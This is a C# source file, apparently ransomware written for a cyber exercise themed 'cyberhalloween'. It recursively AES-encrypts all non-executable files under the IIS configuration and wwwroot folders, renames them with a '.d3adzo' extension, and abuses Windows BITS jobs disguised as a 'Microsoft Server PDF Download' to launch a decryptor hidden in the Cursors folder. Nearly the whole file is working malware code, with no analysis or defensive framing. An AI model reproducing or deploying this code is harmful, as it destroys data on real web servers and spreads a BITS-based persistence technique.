using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using BITS = BITSReference1_5;

namespace encryptor
{
    class Program
    {
        //mouse1 encryptor, mouse2 decryptor
        static string key = "cyberhalloween";
        static void Main(string[] args)
        {
            string[] hits = { @"C:\Windows\System32\inetsrv\config", @"C:\inetpub\wwwroot" };
            foreach (string path in hits)
            {
                encryptmain(path);
            }

        }

        public static void encryptmain(string path)
        {
            string[] files = Directory.GetFiles(path, "*.*", SearchOption.AllDirectories);
            for (int i = 0; i < files.Length; i++)
            {
                if (!files[i].Contains(".exe") && !files[i].Contains(".dll"))
                {
                    try
                    {
                        byte[] filebytes = File.ReadAllBytes(files[i]);

                        byte[] encrypted = encryptfile(filebytes);
                        File.WriteAllBytes(files[i], encrypted);
                        File.Move(files[i], files[i] + ".d3adzo");
                    }
                    catch (Exception) { continue; }

                }
            }
        }

        public static byte[] encryptfile(byte[] arr)
        {
            byte[] encrypted;
            PasswordDeriveBytes pdb = new PasswordDeriveBytes(key, new byte[] { 0x43, 0x87, 0x23, 0x72 });
            MemoryStream ms = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = pdb.GetBytes(aes.KeySize / 8);
            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
            cs.Write(arr, 0, arr.Length);
            cs.Close();
            encrypted = ms.ToArray();

            return encrypted;
        }

        public void setupDecrypt()
        {
            System.IO.File.Move(@"C:\Windows\Cursors\mouse2.exe", @"C:\Users\ghost\Desktop\decryptor.exe"); //iis 
            //System.IO.File.Move(@"C:\Windows\Cursors\mouse2.exe", @"C:\Users\ghoul\Desktop\decryptor.exe"); //tomcat
            executeBITSJob();
        }

        private void executeBITSJob()

        {
            BITS.BackgroundCopyManager1_5 mgr = new BITS.BackgroundCopyManager1_5();
            BITS.GUID jobGuid;
            BITS.IBackgroundCopyJob job;

            mgr.CreateJob("Microsoft Server PDF Download", BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
            job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Program Files\Common Files\microsoft shared\Server.pdf");

            job.Resume();
            bool jobIsFinal = false;
            while (!jobIsFinal)
            {
                BITS.BG_JOB_STATE state;
                job.GetState(out state);
                switch (state)
                {
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ERROR:
                        System.Threading.Thread.Sleep(500); // delay a little bit
                        break;
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_TRANSFERRED:
                        job.Complete();
                        break;
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ACKNOWLEDGED:
                        jobIsFinal = true;
                        break;
                    default:
                        System.Threading.Thread.Sleep(500); // delay a little bit
                        break;
                }
            }

            string username = Environment.UserName;
            string path = @"C:\Users\ghost\Desktop\decryptor.exe"; //iis
            //string path = @"C:\Users\ghoul\Desktop\decryptor.exe"; //tomcat

            mgr.CreateJob("Microsoft Server PDF Download", BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
            job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Program Files\Common Files\microsoft shared\Server.pdf");

            var job2 = job as BITS.IBackgroundCopyJob2;
            job2.SetNotifyCmdLine(path, "");

            job.SetMinimumRetryDelay(3);
            job.Resume();

        }
    }
}